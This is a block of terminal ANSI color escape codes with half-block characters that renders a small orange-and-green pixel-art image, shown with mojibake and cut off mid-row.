  [48;2;98;178;78m[38;2;46;76;38m‚ñÑ[48;2;100;178;80m[38;2;50;69;45m‚ñÑ[48;2;99;176;80m[38;2;35;46;33m‚ñÑ[48;2;82;148;65m[38;2;7;9;6m‚ñÑ[48;2;64;117;50m[38;2;35;54;30m‚ñÑ[48;2;42;77;34m[38;2;52;107;39m‚ñÑ[48;2;26;46;21m[38;2;80;194;52m‚ñÑ[48;2;34;71;26m[38;2;73;216;38m‚ñÑ[48;2;54;133;35m[38;2;67;192;32m‚ñÑ[48;2;81;199;52m[38;2;81;158;23m‚ñÑ[48;2;80;218;46m[38;2;100;110;11m‚ñÑ[48;2;66;199;33m[38;2;152;98;2m‚ñÑ[48;2;60;157;26m[38;2;220;129;1m‚ñÑ[48;2;80;128;18m[38;2;251;145;0m‚ñÑ[48;2;120;110;9m[38;2;255;147;0m‚ñÑ[48;2;154;106;4m[38;2;255;147;0m‚ñÑ[48;2;181;114;2m[38;2;255;147;0m‚ñÑ[48;2;230;134;0m[38;2;255;147;0m‚ñÑ[48;2;251;144;0m[38;2;255;147;0m‚ñÑ[48;2;254;146;0m[38;2;255;147;0m‚ñÑ[48;2;255;147;0m [48;2;163;94;0m[38;2;134;78;0m‚ñÑ[48;2;2;1;0m[38;2;58;33;0m‚ñÑ[48;2;13;7;0m[38;2;133;76;0m‚ñÑ[48;2;64;38;0m[38;2;12;7;0m‚ñÑ[48;2;250;144;0m[38;2;234;135;0m‚ñÑ[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;249;146;0m[38;2;255;147;0m‚ñÑ[48;2;239;143;2m[38;2;255;147;0m‚ñÑ[48;2;223;131;1m[38;2;255;147;0m‚ñÑ[48;2;192;120;2m[38;2;255;147;0m‚ñÑ[48;2;130;96;5m[38;2;255;147;0m‚ñÑ[48;2;82;88;9m[38;2;255;148;0m‚ñÑ[48;2;62;104;15m[38;2;247;147;1m‚ñÑ[48;2;49;132;22m[38;2;212;134;3m‚ñÑ[48;2;57;165;32m[38;2;144;95;3m‚ñÑ[48;2;53;117;38m[38;2;74;61;8m‚ñÑ[48;2;50;97;39m[38;2;47;60;21m‚ñÑ[48;2;35;56;29m[38;2;47;81;33m‚ñÑ[48;2;17;22;15m[38;2;20;34;19m‚ñÑ[48;2;31;50;26m[38;2;48;73;42m‚ñÑ[48;2;55;90;47m[38;2;37;56;33m‚ñÑ[48;2;78;132;64m[38;2;21;31;18m‚ñÑ[48;2;95;167;78m[38;2;18;26;16m‚ñÑ[0m
  [48;2;48;74;43m[38;2;51;78;45m‚ñÑ[48;2;48;74;43m[38;2;50;76;44m‚ñÑ[48;2;46;71;42m[38;2;12;17;11m‚ñÑ[48;2;32;54;28m[38;2;45;93;35m‚ñÑ[48;2;58;112;46m[38;2;26;45;17m‚ñÑ[48;2;55;130;37m[38;2;121;83;5m‚ñÑ[48;2;57;133;27m[38;2;232;138;0m‚ñÑ[48;2;101;96;8m[38;2;253;146;0m‚ñÑ[48;2;200;118;1m[38;2;254;147;0m‚ñÑ[48;2;248;144;0m[38;2;255;147;0m‚ñÑ[48;2;254;147;0m[38;2;255;147;0m‚ñÑ[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;173;100;0m[38;2;210;122;0m‚ñÑ[48;2;172;100;0m[38;2;76;44;0m‚ñÑ[48;2;214;123;0m[38;2;153;88;0m‚ñÑ[48;2;36;21;0m[38;2;162;94;0m‚ñÑ[48;2;201;116;0m[38;2;20;12;0m‚ñÑ[48;2;254;147;0m[38;2;238;137;0m‚ñÑ[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;254;147;0m[38;2;255;147;0m‚ñÑ[48;2;241;143;1m[38;2;255;147;0m‚ñÑ[48;2;213;125;0m[38;2;255;147;0m‚ñÑ[48;2;117;73;3m[38;2;252;147;1m‚ñÑ[48;2;25;36;21m[38;2;94;69;18m‚ñÑ[48;2;50;77;44m[38;2;39;59;33m‚ñÑ[48;2;51;78;45m [48;2;51;78;44m[38;2;51;78;45m‚ñÑ[0m
  [48;2;51;78;45m[38;2;50;76;44m‚ñÑ[48;2;40;58;34m[38;2;43;36;13m‚ñÑ[48;2;38;37;6m[38;2;240;143;2m‚ñÑ[48;2;149;95;6m[38;2;254;147;0m‚ñÑ[48;2;226;134;1m[38;2;255;147;0m‚ñÑ[48;2;253;146;0m[38;2;255;147;0m‚ñÑ[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m[38;2;243;140;0m‚ñÑ[48;2;116;67;0m[38;2;90;52;0m‚ñÑ[48;2;237;137;0m[38;2;254;147;0m‚ñÑ[48;2;248;143;0m[38;2;255;147;0m‚ñÑ[48;2;250;144;0m[38;2;255;147;0m‚ñÑ[48;2;45;25;0m[38;2;191;110;0m‚ñÑ[48;2;64;36;0m[38;2;32;18;0m‚ñÑ[48;2;245;141;0m[38;2;152;87;0m‚ñÑ[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;254;147;0m[38;2;255;147;0m‚ñÑ[48;2;230;140;6m[38;2;254;147;0m‚ñÑ[48;2;25;21;7m[38;2;143;86;2m‚ñÑ[48;2;48;74;42m[38;2;39;60;34m‚ñÑ[48;2;51;78;45m [0m
  [48;2;41;63;37m[38;2;40;47;23m‚ñÑ[48;2;119;70;1m[38;2;230;135;0m‚ñÑ[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;180;104;0m[38;2;120;68;0m‚ñÑ[48;2;135;78;0m[38;2;158;91;0m‚ñÑ[48;2;255;147;0m[38;2;250;145;0m‚ñÑ[48;2;255;147;0m [48;2;255;147;0m[38;2;254;146;0m‚ñÑ[48;2;252;145;0m[38;2;209;120;0m‚ñÑ[48;2;54;31;0m[38;2;61;35;0m‚ñÑ[48;2;94;54;0m[38;2;159;91;0m‚ñÑ[48;2;254;146;0m[38;2;244;140;0m‚ñÑ[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;240;144;1m[38;2;255;147;0m‚ñÑ[48;2;36;40;18m[38;2;70;49;6m‚ñÑ[48;2;50;78;45m[38;2;45;69;40m‚ñÑ[0m
  [48;2;65;48;9m[38;2;98;64;6m‚ñÑ[48;2;255;149;0m[38;2;255;147;0m‚ñÑ[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;254;147;0m[38;2;254;146;0m‚ñÑ[48;2;225;130;0m[38;2;175;100;0m‚ñÑ[48;2;210;120;0m[38;2;253;146;0m‚ñÑ[48;2;209;121;0m[38;2;254;147;0m‚ñÑ[48;2;86;49;0m[38;2;189;109;0m‚ñÑ[48;2;254;146;0m[38;2;142;81;0m‚ñÑ[48;2;255;147;0m[38;2;102;59;0m‚ñÑ[48;2;199;115;0m[38;2;69;40;0m‚ñÑ[48;2;244;141;0m[38;2;238;138;0m‚ñÑ[48;2;253;146;0m[38;2;184;105;0m‚ñÑ[48;2;200;115;0m[38;2;231;134;0m‚ñÑ[48;2;253;147;0m[38;2;254;146;0m‚ñÑ[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;149;98;7m[38;2;215;132;5m‚ñÑ[48;2;35;54;32m[38;2;31;42;22m‚ñÑ[0m
  [48;2;133;82;3m[38;2;153;89;0m‚ñÑ[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m[38;2;255;146;0m‚ñÑ[48;2;255;147;0m[38;2;255;146;0m‚ñÑ[48;2;255;147;0m [48;2;255;147;0m[38;2;254;148;0m‚ñÑ[48;2;255;147;0m[38;2;248;147;0m‚ñÑ[48;2;254;147;0m[38;2;242;142;0m‚ñÑ[48;2;204;116;0m[38;2;224;131;0m‚ñÑ[48;2;200;115;0m[38;2;205;124;1m‚ñÑ[48;2;199;115;0m[38;2;175;109;2m‚ñÑ[48;2;172;100;0m[38;2;157;102;2m‚ñÑ[48;2;168;97;0m[38;2;172;114;3m‚ñÑ[48;2;206;119;0m[38;2;156;115;5m‚ñÑ[48;2;215;125;0m[38;2;138;111;7m‚ñÑ[48;2;180;105;0m[38;2;121;105;8m‚ñÑ[48;2;233;136;0m[38;2;120;109;8m‚ñÑ[48;2;254;148;0m[38;2;116;111;9m‚ñÑ[48;2;254;148;0m[38;2;112;111;10m‚ñÑ[48;2;255;148;0m[38;2;130;121;10m‚ñÑ[48;2;254;148;0m[38;2;103;105;10m‚ñÑ[48;2;254;148;0m[38;2;99;99;9m‚ñÑ[48;2;254;148;0m[38;2;106;98;8m‚ñÑ[48;2;254;148;0m[38;2;106;96;8m‚ñÑ[48;2;255;148;0m[38;2;118;98;7m‚ñÑ[48;2;255;147;0m[38;2;123;101;7m‚ñÑ[48;2;255;147;0m[38;2;129;99;6m‚ñÑ[48;2;255;147;0m[38;2;141;100;5m‚ñÑ[48;2;255;147;0m[38;2;166;111;4m‚ñÑ[48;2;255;147;0m[38;2;189;122;4m‚ñÑ[48;2;255;147;0m[38;2;217;131;1m‚ñÑ[48;2;255;147;0m[38;2;248;145;0m‚ñÑ[48;2;255;147;0m[38;2;250;148;0m‚ñÑ[48;2;255;147;0m[38;2;254;149;0m‚ñÑ[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;249;147;1m[38;2;254;147;0m‚ñÑ[48;2;47;44;15m[38;2;81;54;7m‚ñÑ[0m
  [48;2;163;95;0m[38;2;176;103;0m‚ñÑ[48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m [48;2;255;147;0m[38;2;254;147;0m‚ñÑ[48;2;255;147;0m[38;2;250;144;0m‚ñÑ[48;2;255;147;0m[38;2;238;146;1m‚ñÑ[48;2;254;147;0m[38;2;170;117;4m‚ñÑ[48;2;252;147;0m[38;2;78;65;5m‚ñÑ[48;2;239;144;1m[38;2;36;71;11m‚ñÑ[48;2;220;136;2m[38;2;41;122;21m‚ñÑ[48;2;193;124;2m[38;2;59;179;31m‚ñÑ[48;2;178;119;4m[38;2;69;210;35m‚ñÑ[48;2;129;104;6m[38;2;73;219;37m‚ñÑ[48;2;67;87;10m[38;2;73;219;37m‚ñÑ[48;2;61;106;15m[38;2;73;218;37m‚ñÑ[48;2;52;126;21m[38;2;73;218;37m‚ñÑ[48;2;52;150;25m[38;2;73;218;37m‚ñÑ[48;2;58;177;30m[38;2;73;218;37m‚ñÑ[48;2;63;194;33m[38;2;73;218;37m‚ñÑ[48;2;66;204;34m[38;2;73;218;37m‚ñÑ[48;2;69;212;36m[38;2;73;218;37m‚ñÑ[48;2;72;217;36m[38;2;73;218;37m‚ñÑ[48;2;72;219;37m[38;2;73;218;37m‚ñÑ[48;2;73;220;37m[38;2;73;218;37m‚ñÑ[48;2;73;220;37m[38;2;73;218;37m‚ñÑ[48;2;73;220;37m[38;2;73;218;37m‚ñÑ[48;2;73;220;37m[38;2;73;218;37m‚ñÑ[48;2;73;220;37m[38;2;73;218;37m‚ñÑ[48;2;74;220;37m[38;2;73;218;37m‚ñÑ[48;2;73;220;37m[38;2;73;218;37m‚ñÑ[48;2;73;219;37m[38;2;73;218;37m‚ñÑ[48;2;72;214;36m[38;2;73;218;37m‚ñÑ[48;2;68;207;35m[38;2;73;218;37m‚ñÑ[48;2;65;197;34m[38;2;73;218;37m‚ñÑ[48;2;61;185;32m[38;2;73;218;37m‚ñÑ[48;2;51;157;27m[38;2;73;218;37m‚ñÑ[48;2;41;125;21m[38;2;73;218;37m‚ñÑ[48;2;40;106;18m[38;2;73;218;37m‚ñÑ[48;2;75;92;10m[38;2;73;218;37m‚ñÑ[48;2;76;85;10m[38;2;73;219;37m‚ñÑ[48;2;112;94;7m[38;2;72;216;36m‚ñÑ[48;2;162;113;5m[38;2;64;194;33m‚ñÑ[48;2;219;131;0m[38;2;50;152;26m‚ñÑ[48;2;231;138;1m[38;2;30;65;14m‚ñÑ[48;2;252;147;0m[38;2;106;71;5m‚ñÑ[48;2;97;61;4m[38;2;30;31;7m‚ñÑ[0m
  [48;2;186;108;0m[38;2;185;108;0m‚ñÑ[48;2;255;147;0m[38;2;254;148;0m‚ñÑ[48;2;255;147;0m[38;2;247;144;0m‚ñÑ[48;2;255;147;0m[38;2;188;113;1m‚ñÑ[48;2;255;147;0m[38;2;110;100;8m‚ñÑ[48;2;248;147;0m[38;2;72;136;20m‚ñÑ[48;2;206;124;1m[38;2;62;175;29m‚ñÑ[48;2;115;81;4m[38;2;67;204;34m‚ñÑ[48;2;55;92;13m[38;2;72;217;36m‚ñÑ[48;2;60;157;26m[38;2;73;218;37m‚ñÑ[48;2;66;195;32m[38;2;73;218;37m‚ñÑ[48;2;70;212;35m[38;2;73;218;37m‚ñÑ[48;2;72;215;36m[38;2;73;218;37m‚ñÑ[48;2;73;217;36m[38;2;73;218;37m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;71;210;37m[38;2;71;214;37m‚ñÑ[48;2;58;142;37m[38;2;57;136;37m‚ñÑ[48;2;51;109;39m[38;2;54;109;40m‚ñÑ[48;2;36;76;26m[38;2;38;71;31m‚ñÑ[0m
  [48;2;73;63;12m[38;2;24;46;20m‚ñÑ[48;2;89;67;7m[38;2;54;120;38m‚ñÑ[48;2;67;119;19m[38;2;66;192;35m‚ñÑ[48;2;61;177;29m[38;2;73;217;37m‚ñÑ[48;2;71;213;36m[38;2;73;218;37m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;71;214;35m[38;2;42;129;21m‚ñÑ[48;2;43;131;22m[38;2;4;10;2m‚ñÑ[48;2;37;111;19m[38;2;4;10;2m‚ñÑ[48;2;60;180;30m[38;2;7;22;3m‚ñÑ[48;2;73;218;37m[38;2;62;187;31m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;72;217;36m‚ñÑ[48;2;69;208;35m[38;2;20;61;10m‚ñÑ[48;2;43;129;22m[38;2;4;11;2m‚ñÑ[48;2;38;116;19m[38;2;3;8;1m‚ñÑ[48;2;64;192;32m[38;2;19;57;10m‚ñÑ[48;2;73;218;37m[38;2;73;219;37m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;214;36m[38;2;71;213;36m‚ñÑ[48;2;55;130;37m[38;2;55;123;38m‚ñÑ[48;2;54;108;41m[38;2;56;110;44m‚ñÑ[48;2;35;60;30m[38;2;35;57;30m‚ñÑ[0m
  [48;2;37;68;29m[38;2;38;61;33m‚ñÑ[48;2;58;132;39m[38;2;62;134;45m‚ñÑ[48;2;64;179;36m[38;2;55;129;37m‚ñÑ[48;2;72;217;36m[38;2;71;210;36m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;27;82;14m[38;2;59;178;30m‚ñÑ[48;2;4;11;3m[38;2;3;9;1m‚ñÑ[48;2;0;0;0m[38;2;8;18;4m‚ñÑ[48;2;1;3;1m[38;2;4;12;2m‚ñÑ[48;2;36;112;19m[38;2;54;163;27m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;70;210;36m[38;2;72;217;36m‚ñÑ[48;2;4;11;1m[38;2;9;28;4m‚ñÑ[48;2;0;0;0m[38;2;6;16;3m‚ñÑ[48;2;1;3;1m[38;2;6;15;3m‚ñÑ[48;2;13;39;6m[38;2;32;94;15m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;70;207;36m[38;2;67;196;36m‚ñÑ[48;2;52;110;38m [48;2;57;101;47m[38;2;56;90;47m‚ñÑ[48;2;36;55;31m[38;2;38;58;33m‚ñÑ[0m
  [48;2;40;63;35m[38;2;43;67;38m‚ñÑ[48;2;61;117;48m[38;2;45;80;38m‚ñÑ[48;2;54;114;39m[38;2;52;110;38m‚ñÑ[48;2;64;177;36m[38;2;59;150;37m‚ñÑ[48;2;72;217;36m[38;2;72;214;36m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;36m[38;2;73;218;37m‚ñÑ[48;2;61;182;30m[38;2;73;218;37m‚ñÑ[48;2;45;135;22m[38;2;73;218;37m‚ñÑ[48;2;58;174;29m[38;2;73;218;37m‚ñÑ[48;2;72;217;36m[38;2;73;218;37m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;71;212;35m[38;2;72;216;36m‚ñÑ[48;2;34;101;17m[38;2;11;32;5m‚ñÑ[48;2;34;101;17m[38;2;1;2;1m‚ñÑ[48;2;34;98;18m[38;2;1;3;1m‚ñÑ[48;2;35;101;18m[38;2;1;1;1m‚ñÑ[48;2;35;100;17m[38;2;1;3;1m‚ñÑ[48;2;57;170;29m[38;2;56;168;28m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;36m[38;2;72;218;36m‚ñÑ[48;2;66;197;33m[38;2;72;217;36m‚ñÑ[48;2;46;139;23m[38;2;73;217;37m‚ñÑ[48;2;54;163;27m[38;2;72;217;37m‚ñÑ[48;2;71;212;36m[38;2;72;217;36m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;37m[38;2;70;204;36m‚ñÑ[48;2;60;158;37m[38;2;53;122;37m‚ñÑ[48;2;52;103;38m[38;2;52;104;40m‚ñÑ[48;2;33;54;28m[38;2;21;34;18m‚ñÑ[48;2;46;70;41m[38;2;49;76;44m‚ñÑ[0m
  [48;2;49;76;44m[38;2;51;78;45m‚ñÑ[48;2;32;51;28m[38;2;43;65;37m‚ñÑ[48;2;61;125;45m[38;2;81;124;71m‚ñÑ[48;2;54;124;38m[38;2;53;113;40m‚ñÑ[48;2;68;202;36m[38;2;60;156;37m‚ñÑ[48;2;73;218;37m[38;2;72;215;36m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;73;216;37m‚ñÑ[48;2;73;217;37m[38;2;93;205;61m‚ñÑ[48;2;79;213;44m[38;2;121;189;95m‚ñÑ[48;2;85;210;51m[38;2;132;184;108m‚ñÑ[48;2;82;211;47m[38;2;121;191;93m‚ñÑ[48;2;73;217;37m[38;2;85;210;52m‚ñÑ[48;2;73;218;37m[38;2;73;217;37m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;37;111;20m[38;2;71;214;36m‚ñÑ[48;2;1;2;0m[38;2;44;128;22m‚ñÑ[48;2;2;4;2m[38;2;15;39;8m‚ñÑ[48;2;1;1;1m[38;2;29;82;14m‚ñÑ[48;2;13;37;7m[38;2;68;204;34m‚ñÑ[48;2;70;210;35m[38;2;73;218;37m‚ñÑ[48;2;73;217;37m[38;2;73;218;37m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;217;37m[38;2;74;216;38m‚ñÑ[48;2;82;211;47m[38;2;118;191;90m‚ñÑ[48;2;100;200;70m[38;2;132;185;108m‚ñÑ[48;2;103;201;72m[38;2;127;187;101m‚ñÑ[48;2;98;203;67m[38;2;125;189;100m‚ñÑ[48;2;85;209;52m[38;2;116;192;88m‚ñÑ[48;2;73;217;37m[38;2;80;211;44m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;72;217;36m[38;2;68;200;35m‚ñÑ[48;2;63;170;35m[38;2;54;125;36m‚ñÑ[48;2;51;103;38m[38;2;51;99;38m‚ñÑ[48;2;49;101;36m[38;2;22;45;17m‚ñÑ[48;2;30;47;26m[38;2;45;69;39m‚ñÑ[48;2;51;78;45m [0m
  [48;2;51;78;45m [48;2;49;75;43m[38;2;51;78;45m‚ñÑ[48;2;30;38;27m[38;2;39;59;35m‚ñÑ[48;2;63;123;49m[38;2;71;110;62m‚ñÑ[48;2;54;121;37m[38;2;56;119;40m‚ñÑ[48;2;68;198;37m[38;2;60;158;37m‚ñÑ[48;2;73;218;37m[38;2;71;216;36m‚ñÑ[48;2;73;217;37m[38;2;73;216;38m‚ñÑ[48;2;91;206;58m[38;2;110;196;81m‚ñÑ[48;2;122;191;95m[38;2;126;188;100m‚ñÑ[48;2;128;186;102m[38;2;130;187;104m‚ñÑ[48;2;140;180;116m[38;2;128;187;103m‚ñÑ[48;2;126;188;100m[38;2;106;197;76m‚ñÑ[48;2;96;202;64m[38;2;75;215;39m‚ñÑ[48;2;73;217;37m[38;2;72;218;36m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;74;220;37m[38;2;73;218;37m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;74;217;38m[38;2;73;217;37m‚ñÑ[48;2;114;194;86m[38;2;76;215;40m‚ñÑ[48;2;142;178;121m[38;2;94;205;62m‚ñÑ[48;2;150;176;129m[38;2;109;196;81m‚ñÑ[48;2;142;180;120m[38;2;95;203;63m‚ñÑ[48;2;116;193;88m[38;2;76;214;41m‚ñÑ[48;2;78;213;44m[38;2;73;217;37m‚ñÑ[48;2;73;218;37m[38;2;73;217;37m‚ñÑ[48;2;73;218;37m[38;2;67;196;36m‚ñÑ[48;2;71;209;37m[38;2;60;154;36m‚ñÑ[48;2;59;152;36m[38;2;57;138;37m‚ñÑ[48;2;52;110;38m[38;2;56;130;37m‚ñÑ[48;2;51;104;38m[38;2;30;71;21m‚ñÑ[48;2;20;31;17m[38;2;45;69;39m‚ñÑ[48;2;50;78;44m[38;2;51;78;45m‚ñÑ[48;2;51;78;45m [0m
  [48;2;51;78;45m[38;2;28;43;24m‚ñÑ[48;2;51;78;45m[38;2;43;64;38m‚ñÑ[48;2;51;78;45m[38;2;52;79;46m‚ñÑ[48;2;34;53;30m[38;2;46;71;41m‚ñÑ[48;2;64;124;48m[38;2;49;106;36m‚ñÑ[48;2;53;115;38m[38;2;57;124;40m‚ñÑ[48;2;63;175;36m[38;2;55;126;38m‚ñÑ[48;2;73;217;37m[38;2;66;186;36m‚ñÑ[48;2;89;208;56m[38;2;73;217;37m‚ñÑ[48;2;111;195;82m[38;2;75;215;40m‚ñÑ[48;2;109;197;80m[38;2;74;216;38m‚ñÑ[48;2;85;209;52m[38;2;73;218;36m‚ñÑ[48;2;73;216;37m[38;2;73;218;37m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;217;37m[38;2;73;218;37m‚ñÑ[48;2;73;217;37m[38;2;73;218;37m‚ñÑ[48;2;73;217;36m[38;2;73;218;37m‚ñÑ[48;2;73;218;37m[38;2;71;214;36m‚ñÑ[48;2;71;212;36m[38;2;63;172;36m‚ñÑ[48;2;63;174;35m[38;2;57;138;37m‚ñÑ[48;2;58;146;36m[38;2;57;137;38m‚ñÑ[48;2;58;139;37m[38;2;57;138;37m‚ñÑ[48;2;58;138;37m[38;2;54;128;35m‚ñÑ[48;2;50;117;34m[38;2;20;44;14m‚ñÑ[48;2;20;32;17m[38;2;39;61;34m‚ñÑ[48;2;51;77;44m[38;2;45;69;40m‚ñÑ[48;2;51;78;45m[38;2;45;69;40m‚ñÑ[48;2;51;78;45m[38;2;49;75;43m‚ñÑ[0m
  [48;2;84;151;67m[38;2;98;177;78m‚ñÑ[48;2;43;80;34m[38;2;98;177;78m‚ñÑ[48;2;22;39;19m[38;2;98;178;78m‚ñÑ[48;2;43;67;38m[38;2;81;148;64m‚ñÑ[48;2;40;70;33m[38;2;44;78;36m‚ñÑ[48;2;54;127;36m[38;2;21;47;15m‚ñÑ[48;2;55;120;39m[38;2;54;117;39m‚ñÑ[48;2;56;133;37m[38;2;59;133;40m‚ñÑ[48;2;71;211;36m[38;2;61;164;37m‚ñÑ[48;2;73;217;36m[38;2;71;211;36m‚ñÑ[48;2;73;218;37m[38;2;72;218;36m‚ñÑ[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m 